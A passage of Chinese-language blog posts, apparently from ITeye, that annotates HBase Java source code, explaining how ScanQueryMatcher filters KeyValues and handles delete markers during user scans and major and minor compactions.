 * 5. Delete markers should not be counted as version
 
 * 6. Delete markers affect puts of the *same* TS
 
 * 7. Delete marker need to be version counted together with puts
 
 * they affect
 
 */
 
bytetype = bytes[initialOffset + keyLength – 1];
 
如果当前KV是删除的KV。
 
if (kv.isDelete()) {
 
此处会进入。把删除的KV添加到DeleteTracker中，默认是ScanDeleteTracker
 
if (!keepDeletedCells) {
 
// first ignore delete markers if the scanner can do so, and the
 
// range does not include the marker
 
//
 
// during flushes and compactions also ignore delete markers newer
 
// than the readpoint of any open scanner, this prevents deleted
 
// rows that could still be seen by a scanner from being collected
 
booleanincludeDeleteMarker = seePastDeleteMarkers ?
 
tr.withinTimeRange(timestamp) :
 
tr.withinOrAfterTimeRange(timestamp);
 
if (includeDeleteMarker
 
 && kv.getMvccVersion() <= maxReadPointToTrackVersions) {
 
this.deletes.add(bytes, offset, qualLength, timestamp, type);
 
 }
 
// Can't early out now, because DelFam come before any other keys
 
 }
 
此处的检查不会进入,userscan不保留删除的数据
 
if (retainDeletesInOutput
 
 || (!isUserScan && (EnvironmentEdgeManager.currentTimeMillis() - timestamp) <= timeToPurgeDeletes)
 
 || kv.getMvccVersion() > maxReadPointToTrackVersions) {
 
// always include or it is not time yet to check whether it is OK
 
// to purge deltes or not
 
if (!isUserScan) {
 
// if this is not a user scan (compaction), we can filter this deletemarker right here
 
// otherwise (i.e. a "raw" scan) we fall through to normal version and timerange checking
 
returnMatchCode.INCLUDE;
 
 }
 
 } elseif (keepDeletedCells) {
 
if (timestamp < earliestPutTs) {
 
// keeping delete rows, but there are no puts older than
 
// this delete in the store files.
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
// else: fall through and do version counting on the
 
// delete markers
 
 } else {
 
returnMatchCode.SKIP;
 
 }
 
// note the following next else if...
 
// delete marker are not subject to other delete markers
 
 } elseif (!this.deletes.isEmpty()) {
 
如果deleteTracker中不为空时，也就是当前行中有删除的KV，检查当前KV是否是删除的KV
 
 提示：删除的KV在compare时，比正常的KV要小，所以在执行next操作时，delete的KV会先被查找出来。
 
如果是删除的KV，根据KV的删除类型，如果是版本被删除，返回SKIP。
 
否则如果SCAN中还有下一个要SCAN的column时，返回SEEK_NEXT_COL。
 
否则表示当前行没有需要在进行查找的KV，返回SEEK_NEXT_ROW。
 
DeleteResultdeleteResult = deletes.isDeleted(bytes, offset, qualLength,
 
timestamp);
 
switch (deleteResult) {
 
caseFAMILY_DELETED:
 
caseCOLUMN_DELETED:
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
caseVERSION_DELETED:
 
caseFAMILY_VERSION_DELETED:
 
returnMatchCode.SKIP;
 
caseNOT_DELETED:
 
break;
 
default:
 
thrownewRuntimeException("UNEXPECTED");
 
 }
 
 }
 
检查KV的时间是否在SCAN要查找的时间范围内，
 
inttimestampComparison = tr.compare(timestamp);
 
如果大于SCAN的最大时间，返回SKIP。
 
if (timestampComparison >= 1) {
 
returnMatchCode.SKIP;
 
 } elseif (timestampComparison <= -1) {
 
如果小于SCAN的最小时间，如果SCAN中还有下一个要SCAN的column时，返回SEEK_NEXT_COL。
 
否则表示当前行没有需要在进行查找的KV，返回SEEK_NEXT_ROW。
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
检查当前KV的column是否是SCAN中指定的column列表中包含的值，如果是INCLUDE。
 
否则如果SCAN中还有下一个要SCAN的column时，返回SEEK_NEXT_COL。
 
否则表示当前行没有需要在进行查找的KV，返回SEEK_NEXT_ROW。
 
// STEP 1: Check if the column is part of the requested columns
 
MatchCodecolChecker = columns.checkColumn(bytes, offset, qualLength, type);
 
如果column是SCAN中要查找的column之一
 
if (colChecker == MatchCode.INCLUDE) {
 
ReturnCodefilterResponse = ReturnCode.SKIP;
 
// STEP 2: Yes, the column is part of the requested columns. Check if filter is present
 
if (filter != null) {
 
执行filter.filterKeyValue操作。并返回filter过滤的结果
 
// STEP 3: Filter the key value and return if it filters out
 
filterResponse = filter.filterKeyValue(kv);
 
switch (filterResponse) {
 
caseSKIP:
 
returnMatchCode.SKIP;
 
caseNEXT_COL:
 
如果SCAN中还有下一个要SCAN的column时，返回SEEK_NEXT_COL。
 
否则表示当前行没有需要在进行查找的KV，返回SEEK_NEXT_ROW。
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
caseNEXT_ROW:
 
stickyNextRow = true;
 
returnMatchCode.SEEK_NEXT_ROW;
 
caseSEEK_NEXT_USING_HINT:
 
returnMatchCode.SEEK_NEXT_USING_HINT;
 
default:
 
//It means it is either include or include and seek next
 
break;
 
 }
 
 }
 
/*
 
 * STEP 4: Reaching this step means the column is part of the requested columns and either
 
 * the filter is null or the filter has returned INCLUDE or INCLUDE_AND_NEXT_COL response.
 
 * Now check the number of versions needed. This method call returns SKIP, INCLUDE,
 
 * INCLUDE_AND_SEEK_NEXT_ROW, INCLUDE_AND_SEEK_NEXT_COL.
 
 *
 
 * FilterResponse ColumnChecker Desired behavior
 
 * INCLUDE SKIP row has already been included, SKIP.
 
 * INCLUDE INCLUDE INCLUDE
 
 * INCLUDE INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE INCLUDE_AND_SEEK_NEXT_ROW INCLUDE_AND_SEEK_NEXT_ROW
 
 * INCLUDE_AND_SEEK_NEXT_COL SKIP row has already been included, SKIP.
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_ROW INCLUDE_AND_SEEK_NEXT_ROW
 
 *
 
 * In all the above scenarios, we return the column checker return value except for
 
 * FilterResponse (INCLUDE_AND_SEEK_NEXT_COL) and ColumnChecker(INCLUDE)
 
 */
 
 
 
此处主要是检查KV的是否是SCAN的最大版本内，到这个地方，除非是KV超过了要SCAN的最大版本，或者KV的TTL过期。
 
否则肯定是会包含此KV的值。
 
 
 
colChecker =
 
columns.checkVersions(bytes, offset, qualLength, timestamp, type,
 
kv.getMvccVersion() > maxReadPointToTrackVersions);
 
//Optimize with stickyNextRow
 
stickyNextRow = colChecker == MatchCode.INCLUDE_AND_SEEK_NEXT_ROW ? true : stickyNextRow;
 
return (filterResponse == ReturnCode.INCLUDE_AND_NEXT_COL &&
 
colChecker == MatchCode.INCLUDE) ? MatchCode.INCLUDE_AND_SEEK_NEXT_COL
 
 : colChecker;
 
 }
 
stickyNextRow = (colChecker == MatchCode.SEEK_NEXT_ROW) ? true
 
 : stickyNextRow;
 
returncolChecker;
 
 }
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Major compaction时的scan操作, hongs-yang.iteye.com.blog.2054176, Thu, 24 Apr 2014 16:14:38 +0800

Major compaction时的scan操作
 
发起major compaction时，通过CompactSplitThread.CompactionRunner.run开始执行
 
 -->region.compact(compaction, store)-->store.compact(compaction)-->
 
CompactionContext.compact,发起compact操作
 
CompactionContext的实例通过HStore中的storeEngine.createCompaction()生成，
 
默认值为DefaultStoreEngine,通过hbase.hstore.engine.class配置。
 
默认的CompactionContext实例为DefaultCompactionContext。
 
而DefaultCompactionContext.compact方法最终调用DefaultStoreEngine.compactor来执行
 
compactor的实现通过hbase.hstore.defaultengine.compactor.class配置，默认实现为DefaultCompactor
 
调用DefaultCompactor.compact(request);
 
 
 
1.根据要进行compact的storefile文件,生成对应的StoreFileScanner集合列表。
 
 在生成StoreFileScanner实例时，每一个scanner中的ScanQueryMatcher为null
 
 
 
2.创建StoreScanner实例，设置ScanType为ScanType.COMPACT_DROP_DELETES。
 
 
 
privateStoreScanner(Storestore, ScanInfo scanInfo, Scan scan,
 
List<? extendsKeyValueScanner> scanners, ScanTypescanType, longsmallestReadPoint,
 
longearliestPutTs, byte[] dropDeletesFromRow, byte[] dropDeletesToRow) throws IOException {
 
this(store, false, scan, null, scanInfo.getTtl(),
 
scanInfo.getMinVersions());
 
if (dropDeletesFromRow == null) {
 
执行这里,传入的columns为null
 
matcher = newScanQueryMatcher(scan, scanInfo, null, scanType,
 
smallestReadPoint, earliestPutTs, oldestUnexpiredTS);
 
 } else {
 
matcher = newScanQueryMatcher(scan, scanInfo, null, smallestReadPoint,
 
earliestPutTs, oldestUnexpiredTS, dropDeletesFromRow, dropDeletesToRow);
 
 }
 
 
 
ScanqueryMatcher的构造方法：
 
传入的columns为null
 
publicScanQueryMatcher(Scan scan, ScanInfo scanInfo,
 
NavigableSet<byte[]> columns, ScanTypescanType,
 
longreadPointToUse, longearliestPutTs, longoldestUnexpiredTS) {
 
tr中mintime=0,maxtime=long.maxvalue
 
this.tr = scan.getTimeRange();
 
this.rowComparator = scanInfo.getComparator();
 
此deletes属性中的kv delete信息为到一个新的row时，都会重新进行清空。
 
this.deletes = newScanDeleteTracker();
 
this.stopRow = scan.getStopRow();
 
this.startKey = KeyValue.createFirstDeleteFamilyOnRow(scan.getStartRow(),
 
scanInfo.getFamily());
 
得到filter实例
 
this.filter = scan.getFilter();
 
this.earliestPutTs = earliestPutTs;
 
this.maxReadPointToTrackVersions = readPointToUse;
 
this.timeToPurgeDeletes = scanInfo.getTimeToPurgeDeletes();
 
此处为的值为false
 
/* how to deal with deletes */
 
this.isUserScan = scanType == ScanType.USER_SCAN;
 
此处的值为false,scanInfo.getKeepDeletedCells()的值默认false,
 
 可通过table的columnfmaily中配置KEEP_DELETED_CELLS属性
 
scan.isRaw()可通过在scan中setAttribute的_raw_属性，默认为false
 
// keep deleted cells: if compaction or raw scan
 
this.keepDeletedCells = (scanInfo.getKeepDeletedCells() && !isUserScan) || scan.isRaw();
 
此处的值为false,此时是major的compact，不保留delete的数据
 
scan.isRaw()可通过在scan中setAttribute的_raw_属性，默认为false
 
// retain deletes: if minor compaction or raw scan
 
this.retainDeletesInOutput = scanType == ScanType.COMPACT_RETAIN_DELETES || scan.isRaw();
 
此时的值为false
 
// seePastDeleteMarker: user initiated scans
 
this.seePastDeleteMarkers = scanInfo.getKeepDeletedCells() && isUserScan;
 
得到查询的最大版本数,此时的scan.maxversion与scanInfo.maxversion的值是相同的值
 
intmaxVersions =
 
scan.isRaw() ? scan.getMaxVersions() : Math.min(scan.getMaxVersions(),
 
scanInfo.getMaxVersions());
 
 
 
生成columns属性的值为ScanWildcardColumnTracker实例，设置hasNullColumn的值为true
 
// Single branch to deal with two types of reads (columns vs all in family)
 
if (columns == null || columns.size() == 0) {
 
// there is always a null column in the wildcard column query.
 
hasNullColumn = true;
 
columns属性中的index表示当前比对到的column的下标值，每比较一行时，此值会重新清空
 
// use a specialized scan for wildcard column tracker.
 
this.columns = newScanWildcardColumnTracker(
 
scanInfo.getMinVersions(), maxVersions, oldestUnexpiredTS);
 
 } else {
 
这个部分在compact时是不会执行的
 
// whether there is null column in the explicit column query
 
hasNullColumn = (columns.first().length == 0);
 
 
 
// We can share the ExplicitColumnTracker, diff is we reset
 
// between rows, not between storefiles.
 
this.columns = newExplicitColumnTracker(columns,
 
scanInfo.getMinVersions(), maxVersions, oldestUnexpiredTS);
 
 }
 
 }
 
 
 
ScanQueryMatcher.match过滤kv是否包含的方法分析
 
在通过StoreScanner.next(kvlist,limit)得到下一行的kv集合时
 
 调用ScanQueryMatcher.match来过滤数据的方法分析
 
其中match方法返回的值具体作用可参见StoreScanner中的如下方法：
 
public boolean next(List<Cell> outResult, int limit).....
 
 
 
 public MatchCode match(KeyValue kv) throws IOException {
 
调用filter的filterAllRemaining方法，如果此方法返回true表示此次scan结束
 
if (filter != null && filter.filterAllRemaining()) {
 
returnMatchCode.DONE_SCAN;
 
 }
 
得到kv的值
 
byte [] bytes = kv.getBuffer();
 
KV在bytes中的开始位置
 
intoffset = kv.getOffset();
 
得到key的长度
 
keyvalue的组成：
 
4
4
2
~
1
~
~
8
1
~
kenlen
vlen
rowlen
row
cflen
cf
column
timestamp
kvtype
value
 
 
 
intkeyLength = Bytes.toInt(bytes, offset, Bytes.SIZEOF_INT);
 
得到rowkey的长度记录的开始位置（不包含keylen与vlen）
 
offset += KeyValue.ROW_OFFSET;
 
rowkey的长度记录的开始位置
 
intinitialOffset = offset;
 
得到rowkey的长度
 
shortrowLength = Bytes.toShort(bytes, offset, Bytes.SIZEOF_SHORT);
 
得到rowkey的开始位置
 
offset += Bytes.SIZEOF_SHORT;
 
比较当前传入的kv的rowkey部分是否与当前行中第一个kv的rowkey部分相同。也就是是否是同一行的数据
 
intret = this.rowComparator.compareRows(row, this.rowOffset, this.rowLength,
 
bytes, offset, rowLength);
 
如果当前传入的kv中的rowkey大于当前行的kv的rowkey部分，表示现在传入的kv是下一行，
 
结束当前next操作，(不是结束scan，是结束当次的next，表示这个next的一行数据的所有kv都查找完了)
 
if (ret <= -1) {
 
returnMatchCode.DONE;
 
否则表示当前传入的kv是上一行的数据，需要把当前的scanner向下移动一行
 
 } elseif (ret >= 1) {
 
// could optimize this, if necessary?
 
// Could also be called SEEK_TO_CURRENT_ROW, but this
 
// should be rare/never happens.
 
returnMatchCode.SEEK_NEXT_ROW;
 
 }
 
优化配置，是否需要不执行下面流程，直接把当前的scanner向下移动一行
 
stickyNextRow的值为true的条件:
 
1.ColumnTracker.done返回为true,
 
2.ColumnTracker.checkColumn返回为SEEK_NEXT_ROW.
 
3.filter.filterKeyValue(kv);返回结果为NEXT_ROW。
 
4.ColumnTracker.checkVersions返回为INCLUDE_AND_SEEK_NEXT_ROW。
 
ColumnTracker的实现在scan的columns为null或者是compact scan时为ScanWildcardColumnTracker。
 
否则为ExplicitColumnTracker。
 
 
 
// optimize case.
 
if (this.stickyNextRow)
 
returnMatchCode.SEEK_NEXT_ROW;
 
在ScanWildcardColumnTracker实例中返回值为false,
 
在ExplicitColumnTracker实例中返回值是当前的kv是否大于或等于查找的column列表的总和
 
if (this.columns.done()) {
 
stickyNextRow = true;
 
returnMatchCode.SEEK_NEXT_ROW;
 
 }
 
得到familylen的记录位置
 
//Passing rowLength
 
offset += rowLength;
 
得到family的长度
 
//Skipping family
 
bytefamilyLength = bytes [offset];
 
把位置移动到family的名称记录的位置
 
offset += familyLength + 1;
 
得到column的长度
 
intqualLength = keyLength -
 
 (offset - initialOffset) - KeyValue.TIMESTAMP_TYPE_SIZE;
 
得到kv中timestamp的值
 
longtimestamp = Bytes.toLong(bytes, initialOffset + keyLength – KeyValue.TIMESTAMP_TYPE_SIZE);
 
检查timestamp是否在指定的范围内，主要检查ttl是否过期
 
// check for early out based on timestamp alone
 
if (columns.isDone(timestamp)) {
 
如果发现kv的ttl过期，在ScanWildcardColumnTracker实例中直接返回SEEK_NEXT_COL。这个在compact中是默认
 
在ExplicitColumnTracker实例中检查是否有下一个column如果有返回SEEK_NEXT_COL。否则返回SEEK_NEXT_ROW。
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
 
 
/*
 
 * The delete logic is pretty complicated now.
 
 * This is corroborated by the following:
 
 * 1. The store might be instructed to keep deleted rows around.
 
 * 2. A scan can optionally see past a delete marker now.
 
 * 3. If deleted rows are kept, we have to find out when we can
 
 * remove the delete markers.
 
 * 4. Family delete markers are always first (regardless of their TS)
 
 * 5. Delete markers should not be counted as version
 
 * 6. Delete markers affect puts of the *same* TS
 
 * 7. Delete marker need to be version counted together with puts
 
 * they affect
 
 */
 
得到kv的类型。
 
bytetype = bytes[initialOffset + keyLength – 1];
 
如果kv是删除的kv
 
if (kv.isDelete()) {
 
在默认情况下，此keepDeletedCells值为false,这里的if检查会进去
 
if (!keepDeletedCells) {
 
// first ignore delete markers if the scanner can do so, and the
 
// range does not include the marker
 
//
 
// during flushes and compactions also ignore delete markers newer
 
// than the readpoint of any open scanner, this prevents deleted
 
// rows that could still be seen by a scanner from being collected
 
此时的值为true,scan中的tr默认为alltime=true
 
booleanincludeDeleteMarker = seePastDeleteMarkers ?
 
tr.withinTimeRange(timestamp) :
 
tr.withinOrAfterTimeRange(timestamp);
 
把删除的kv添加到DeleteTracker中。compact时的实现为ScanDeleteTracker。
 
if (includeDeleteMarker
 
 && kv.getMvccVersion() <= maxReadPointToTrackVersions) {
 
this.deletes.add(bytes, offset, qualLength, timestamp, type);
 
 }
 
// Can't early out now, because DelFam come before any other keys
 
 }
 
如果非minor compact时，
 
或者在compact的scan时，同时当前时间减去kv的timestamp还不到hbase.hstore.time.to.purge.deletes配置的时间，
 
 默认的配置值为0,
 
或者kv的mvcc值大于现在最大的mvcc值时。此if会进行。目前在做major compact的scan,不进去
 
if (retainDeletesInOutput
 
 || (!isUserScan && (EnvironmentEdgeManager.currentTimeMillis() - timestamp) <= timeToPurgeDeletes)
 
 || kv.getMvccVersion() > maxReadPointToTrackVersions) {
 
// always include or it is not time yet to check whether it is OK
 
// to purge deltes or not
 
if (!isUserScan) {
 
// if this is not a user scan (compaction), we can filter this deletemarker right here
 
// otherwise (i.e. a "raw" scan) we fall through to normal version and timerange checking
 
returnMatchCode.INCLUDE;
 
 }
 
 以下的检查通常情况不会进入
 
 } elseif (keepDeletedCells) {
 
if (timestamp < earliestPutTs) {
 
// keeping delete rows, but there are no puts older than
 
// this delete in the store files.
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
// else: fall through and do version counting on the
 
// delete markers
 
如果kv是已经delete的kv，添加到DeleteTracker后，直接返回SKIP.
 
 } else {
 
returnMatchCode.SKIP;
 
 }
 
// note the following next else if...
 
// delete marker are not subject to other delete markers
 
 } elseif (!this.deletes.isEmpty()) {
 
如果不是删除的KV时，检查删除的kv中是否包含此kv的版本。
 
a.如果KV是DeleteFamily。同时当前的KV的TIMESTAMP的值小于删除的KV的TIMESTAMP的值，返回FAMILY_DELETED。
 
b.如果KV是DeleteFamilyVersion已经删除掉的版本(删除时指定了timestamp)。返回FAMILY_VERSION_DELETED。
 
c.如果KV的是DeleteColumn，同时deleteTracker中包含的kv中部分qualifier的值
 
 与传入的kv中部分qualifier的值相同。同时delete中包含的kv是DeleteColumn返回COLUMN_DELETED。
 
否则deleteTracker中包含的kv中部分qualifier的值与传入的kv中部分qualifier的值相同。
 
 同时传入的kv中的timestamp的值是delete中的timestamp值，表示删除指定的版本，返回VERSION_DELETED。
 
d.否则表示没有删除的情况，返回NOT_DELETED。
 
DeleteResultdeleteResult = deletes.isDeleted(bytes, offset, qualLength,
 
timestamp);
 
switch (deleteResult) {
 
caseFAMILY_DELETED:
 
caseCOLUMN_DELETED:
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
caseVERSION_DELETED:
 
caseFAMILY_VERSION_DELETED:
 
returnMatchCode.SKIP;
 
caseNOT_DELETED:
 
break;
 
default:
 
thrownewRuntimeException("UNEXPECTED");
 
 }
 
 }
 
检查当前传入的kv的timestamp是否在包含的时间范围内，默认的scan是所有时间都包含
 
inttimestampComparison = tr.compare(timestamp);
 
如果当前kv的时间超过了最大的时间,返回SKIP。
 
if (timestampComparison >= 1) {
 
returnMatchCode.SKIP;
 
 } elseif (timestampComparison <= -1) {
 
如果当前kv的时间小于了最小的时间，返回SEEK_NEXT_COL或者SEEK_NEXT_ROW。
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
如果时间在正常的范围内,columns.checkColumn如果是compact时的scan 此方法返回INCLUDE。
 
其它情况请参见ExplicitColumnTracker的实现。
 
 
 
// STEP 1: Check if the column is part of the requested columns
 
MatchCodecolChecker = columns.checkColumn(bytes, offset, qualLength, type);
 
此处的IF检查会进入
 
if (colChecker == MatchCode.INCLUDE) {
 
执行filter操作，并根据filter的响应返回相关的值，此处不在说明，比较容易看明白。
 
ReturnCodefilterResponse = ReturnCode.SKIP;
 
// STEP 2: Yes, the column is part of the requested columns. Check if filter is present
 
if (filter != null) {
 
// STEP 3: Filter the key value and return if it filters out
 
filterResponse = filter.filterKeyValue(kv);
 
switch (filterResponse) {
 
caseSKIP:
 
returnMatchCode.SKIP;
 
caseNEXT_COL:
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
caseNEXT_ROW:
 
stickyNextRow = true;
 
returnMatchCode.SEEK_NEXT_ROW;
 
caseSEEK_NEXT_USING_HINT:
 
returnMatchCode.SEEK_NEXT_USING_HINT;
 
default:
 
//It means it is either include or include and seek next
 
break;
 
 }
 
 }
 
/*
 
 * STEP 4: Reaching this step means the column is part of the requested columns and either
 
 * the filter is null or the filter has returned INCLUDE or INCLUDE_AND_NEXT_COL response.
 
 * Now check the number of versions needed. This method call returns SKIP, INCLUDE,
 
 * INCLUDE_AND_SEEK_NEXT_ROW, INCLUDE_AND_SEEK_NEXT_COL.
 
 *
 
 * FilterResponse ColumnChecker Desired behavior
 
 * INCLUDE SKIP row has already been included, SKIP.
 
 * INCLUDE INCLUDE INCLUDE
 
 * INCLUDE INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE INCLUDE_AND_SEEK_NEXT_ROW INCLUDE_AND_SEEK_NEXT_ROW
 
 * INCLUDE_AND_SEEK_NEXT_COL SKIP row has already been included, SKIP.
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_COL
 
 * INCLUDE_AND_SEEK_NEXT_COL INCLUDE_AND_SEEK_NEXT_ROW INCLUDE_AND_SEEK_NEXT_ROW
 
 *
 
 * In all the above scenarios, we return the column checker return value except for
 
 * FilterResponse (INCLUDE_AND_SEEK_NEXT_COL) and ColumnChecker(INCLUDE)
 
 */
 
colChecker =
 
columns.checkVersions(bytes, offset, qualLength, timestamp, type,
 
kv.getMvccVersion() > maxReadPointToTrackVersions);
 
//Optimize with stickyNextRow
 
stickyNextRow = colChecker == MatchCode.INCLUDE_AND_SEEK_NEXT_ROW ? true : stickyNextRow;
 
return (filterResponse == ReturnCode.INCLUDE_AND_NEXT_COL &&
 
colChecker == MatchCode.INCLUDE) ? MatchCode.INCLUDE_AND_SEEK_NEXT_COL
 
 : colChecker;
 
 }
 
stickyNextRow = (colChecker == MatchCode.SEEK_NEXT_ROW) ? true
 
 : stickyNextRow;
 
returncolChecker;
 
 }
 
 
 
major与minor的compact写入新storefile时的区别
 
如果是major的compact的写入，会在close掉writer时，
 
在meta中写入major==true的值MAJOR_COMPACTION_KEY=true。
 
此值主要用来控制做minor的compact时是否选择这个storefile文件。
 
 
 
 if (writer != null) {
 
writer.appendMetadata(fd.maxSeqId, request.isMajor());
 
writer.close();
 
newFiles.add(writer.getPath());
 
 }
 
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
minor compaction时的scan操作分析, hongs-yang.iteye.com.blog.2053107, Wed, 23 Apr 2014 14:00:19 +0800

minor compaction时的scan操作分析
 
minor compaction时的scan主要是对store下的几个storefile文件进行合并,通常不做数据删除操作。
 
compaction的发起通过CompactSplitThread.requestCompactionInternal-->
 
 CompactSplitThread.CompactionRunner.run-->region.compact-->HStore.compact
 
 -->DefaultStoreEngine.DefaultCompactionContext.compact-->
 
DefaultCompactor.compact
 
 
生成compaction时的StoreScanner
 
1.通过要进行compact的几个storefile生成StoreFileScanner,,以下是生成实例时的方法层次调用
 
 
DefaultCompactor.compact方法中的部分代码,得到每一个storefile的StoreFileScanner实例
 
List<StoreFileScanner> scanners = createFileScanners(request.getFiles());
 
protectedList<StoreFileScanner> createFileScanners(
 
finalCollection<StoreFile> filesToCompact) throws IOException {
 
return StoreFileScanner.getScannersForStoreFiles(filesToCompact, false, false, true);
 
 }
 
 
 
publicstaticList<StoreFileScanner> getScannersForStoreFiles(
 
Collection<StoreFile> files, booleancacheBlocks, booleanusePread,
 
booleanisCompaction) throws IOException {
 
returngetScannersForStoreFiles(files, cacheBlocks, usePread, isCompaction,
 
null);
 
 }
 
在调用此方法时，ScanQueryMatcher传入为null
 
publicstaticList<StoreFileScanner> getScannersForStoreFiles(
 
Collection<StoreFile> files, booleancacheBlocks, booleanusePread,
 
booleanisCompaction, ScanQueryMatcher matcher) throws IOException {
 
List<StoreFileScanner> scanners = newArrayList<StoreFileScanner>(
 
files.size());
 
for (StoreFile file : files) {
 
迭代每一个storefile，生成storefile的reader实例，并根据reader生成storefilescanner
 
生成reader实例-->HFile.createReader-->HFileReaderV2-->StoreFile.Reader
 
 
 
 StoreFile.Reader r = file.createReader();
 
 
 
每一个StoreFileScanner中包含一个HFileScanner
 
 实例生成HFileReaderV2.getScanner-->
 
 检查在table的此cf中配置有DATA_BLOCK_ENCODING属性，表示有指定ENCODING,
 
 此配置的可选值，请参见DataBlockEncoding(如前缀树等)
 
 如果encoding的配置不是NODE，HFileScanner的实例生成为HFileReaderV2.EncodedScannerV2
 
 否则生成的实例为HFileReaderV2.ScannerV2-->
 
 生成StoreFileScanner实例，此实例引用StoreFile.Reader与HFileScanner 
 
以下代码中的isCompaction为true 
 
 
 
 StoreFileScanner scanner = r.getStoreFileScanner(cacheBlocks, usePread,
 
isCompaction);
 
此时的matcher为null
 
scanner.setScanQueryMatcher(matcher);
 
scanners.add(scanner);
 
 }
 
returnscanners;
 
 }
 
 
 
DefaultCompactor.compact方法中的部分代码,生成StoreScanner实例
 
 
得到一个ScanType为保留删除数据的ScanType,scanType=COMPACT_RETAIN_DELETES
 
ScanTypescanType =
 
request.isMajor() ? ScanType.COMPACT_DROP_DELETES
 
 : ScanType.COMPACT_RETAIN_DELETES;
 
scanner = preCreateCoprocScanner(request, scanType, fd.earliestPutTs, scanners);
 
if (scanner == null) {
 
生成一个Scan实例，这个Scan为查询所有版本的Scan,maxVersion为cf设置的最大的maxVersion
 
生成StoreScanner实例
 
 
 
scanner = createScanner(store, scanners, scanType, smallestReadPoint, fd.earliestPutTs);
 
 }
 
scanner = postCreateCoprocScanner(request, scanType, scanner);
 
if (scanner == null) {
 
// NULL scanner returned from coprocessor hooks means skip normal processing.
 
returnnewFiles;
 
 }
 
 
 
生成StoreScanner的构造方法要做和处理流程：代码调用层级如下所示：
 
 
 
protectedInternalScannercreateScanner(Storestore, List<StoreFileScanner> scanners,
 
ScanTypescanType, longsmallestReadPoint, longearliestPutTs) throws IOException {
 
 Scan scan = newScan();
 
scan.setMaxVersions(store.getFamily().getMaxVersions());
 
returnnewStoreScanner(store, store.getScanInfo(), scan, scanners,
 
scanType, smallestReadPoint, earliestPutTs);
 
 }
 
 
 
publicStoreScanner(Storestore, ScanInfo scanInfo, Scan scan,
 
List<? extendsKeyValueScanner> scanners, ScanTypescanType,
 
longsmallestReadPoint, longearliestPutTs) throws IOException {
 
this(store, scanInfo, scan, scanners, scanType, smallestReadPoint, earliestPutTs, null, null);
 
 }
 
 
 
privateStoreScanner(Storestore, ScanInfo scanInfo, Scan scan,
 
List<? extendsKeyValueScanner> scanners, ScanTypescanType, longsmallestReadPoint,
 
longearliestPutTs, byte[] dropDeletesFromRow, byte[] dropDeletesToRow)
 
throws IOException {
 
 
 
调用相关构造方法生成ttl的过期时间，最小版本等信息
 
检查hbase.storescanner.parallel.seek.enable配置是否为true,为true表示并行scanner
 
如果是并行scan时，拿到rs中的执行线程池
 
 
 
this(store, false, scan, null, scanInfo.getTtl(),
 
scanInfo.getMinVersions());
 
if (dropDeletesFromRow == null) {
 
此时通过这里生成ScanQueryMatcher实例
 
matcher = newScanQueryMatcher(scan, scanInfo, null, scanType,
 
smallestReadPoint, earliestPutTs, oldestUnexpiredTS);
 
 } else {
 
matcher = newScanQueryMatcher(scan, scanInfo, null, smallestReadPoint,
 
earliestPutTs, oldestUnexpiredTS, dropDeletesFromRow, dropDeletesToRow);
 
 }
 
 
 
过滤掉bloom filter不存在的storefilescanner，不在时间范围内的scanner与ttl过期的scanner
 
如果一个storefile中最大的更新时间超过了ttl的设置，那么此storefile已经没用，不用参与scan
 
// Filter the list of scanners using Bloom filters, time range, TTL, etc.
 
scanners = selectScannersFrom(scanners);
 
 
 
如果没有配置并行scanner,迭代把每一个scanner seek到指定的开始key处，由于是compaction的scan，默认不seek
 
// Seek all scanners to the initial key
 
if (!isParallelSeekEnabled) {
 
for (KeyValueScannerscanner : scanners) {
 
scanner.seek(matcher.getStartKey());
 
 }
 
 } else {
 
通过线程池，生成ParallelSeekHandler实例，并行去seek到指定的开始位置
 
parallelSeek(scanners, matcher.getStartKey());
 
 }
 
生成一个具体的扫描的scanner,把所有要查找的storefilescanner添加进去，
 
每次的next都需要从不同的scanner里找到最小的一个kv。
 
KeyValueHeap中维护一个PriorityQueue的优先级队列，
 
在默认生成此实例时会生成根据如下来检查那一个storefilescanner在队列的前面
 
1.比较两个storefilescanner中最前面的一个kv，
 
 a.如果rowkey部分不相同直接返回按大小的排序
 
 b.如果rowkey部分相同，比较cf/column/type谁更大，
 
 c.可参见KeyValue.KVComparator.compare
 
2.如果两个storefilescanner中最小的kv相同，比较谁的storefile的seqid更大，返回更大的
 
3.得到当前所有的storefilescanner中最小的kv的一个storefilescanner为HeyValueHead.current属性的值
 
 
 
// Combine all seeked scanners with a heap
 
heap = newKeyValueHeap(scanners, store.getComparator());
 
 }
 
 
 
KeyValueScanner.seek流程分析：
 
KeyValueScanner的实例StoreFileScanner,调用StoreFileScanner.seek,代码调用层级
 
 
 
publicbooleanseek(KeyValue key) throws IOException {
 
if (seekCount != null) seekCount.incrementAndGet();
 
 
 
try {
 
try {
 
if(!seekAtOrAfter(hfs, key)) {
 
close();
 
returnfalse;
 
 }
 
 
 
